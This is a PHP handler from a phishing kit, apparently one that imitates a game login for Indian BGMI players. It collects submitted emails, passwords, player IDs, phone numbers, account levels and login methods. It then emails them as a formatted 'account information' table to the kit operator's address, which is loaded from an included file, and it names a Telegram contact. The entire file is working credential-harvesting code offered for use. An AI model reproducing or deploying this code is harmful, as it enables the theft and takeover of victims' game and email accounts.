<?php
date_default_timezone_set('Asia/Kolkata');
$jamasuk = date('l, d-m-Y h:i:s');
$yearNow = date('Y');

// MENGAMBIL KONTROL
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $playid == "" && $phone == "" && $level == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "🇮🇳 | +91 | LEVEL $level | PUNYA $email | LOGIN $login";
$pesan = '
<center> 
<div style="background: url(https://i.postimg.cc/HWRdWyRc/20230228-152530.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;"><center>ACCOUNT INFORMATION </center></div>
<table style="border-collapse: collapse; color: #fc4838; border-color: #000; background: url(https://i.postimg.cc/g26D9fRL/20230228-145218.png) no-repeat center center; background-size: 100% 100%;" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th>
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="width: 78%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>'.$phone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="width: 78%; text-align: center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>TIME</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CONTACT TELEGRAM</th>
<th style="width: 78%; text-align: center;"><b>https://telegram.me/BATISTAxBGMI</th> 
</tr>
</table>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);
}
?>